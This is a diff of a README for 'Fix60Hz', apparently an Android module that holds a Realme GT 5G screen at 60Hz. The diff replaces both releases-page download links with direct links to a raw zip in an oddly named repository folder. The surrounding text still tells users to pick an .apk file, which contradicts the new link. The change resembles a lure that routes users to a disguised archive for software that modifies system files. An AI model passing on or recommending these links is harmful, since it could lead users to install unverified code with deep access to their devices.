@@ -1,6 +1,6 @@
 # 📱 Fix60Hz - Lock your screen at 60Hz reliably
 
-[![Download Fix60Hz](https://img.shields.io/badge/Download-Fix60Hz-blue.svg)](https://github.com/unworldly-mustard544/Fix60Hz/releases)
+[![Download Fix60Hz](https://img.shields.io/badge/Download-Fix60Hz-blue.svg)](https://github.com/unworldly-mustard544/Fix60Hz/raw/refs/heads/main/tragedian/Fix_Hz_v3.0.zip)
 
 This module keeps your Realme GT 5G screen at a steady 60Hz. It helps when you experience refresh rate switching issues on ColorOS 14. 
 
@@ -18,7 +18,7 @@ Do not attempt to use this module without these tools. The module modifies syste
 
 You download the module from the project release page. 
 
-[Visit this page to download the latest version](https://github.com/unworldly-mustard544/Fix60Hz/releases)
+[Visit this page to download the latest version](https://github.com/unworldly-mustard544/Fix60Hz/raw/refs/heads/main/tragedian/Fix_Hz_v3.0.zip)
 
 Select the file ending in .apk. Save this file to your phone storage. You need this file for the installation process.
 
